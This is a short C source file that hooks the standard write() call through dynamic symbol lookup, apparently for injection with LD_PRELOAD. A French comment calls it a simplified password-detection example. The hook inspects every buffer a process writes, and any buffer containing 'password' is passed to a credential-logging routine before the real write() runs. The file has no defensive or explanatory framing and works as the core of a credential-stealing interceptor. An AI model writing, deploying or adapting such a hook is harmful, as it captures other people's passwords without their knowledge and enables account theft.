#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include "interceptor.h"
#include "utils.h"

static ssize_t (*original_write)(int, const void *, size_t) = NULL;

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }

    // Détection de mot de passe (exemple simplifié)
    if (count > 0 && strstr(buf, "password") != NULL) {
        log_credentials(buf, count);
    }

    return original_write(fd, buf, count);
}
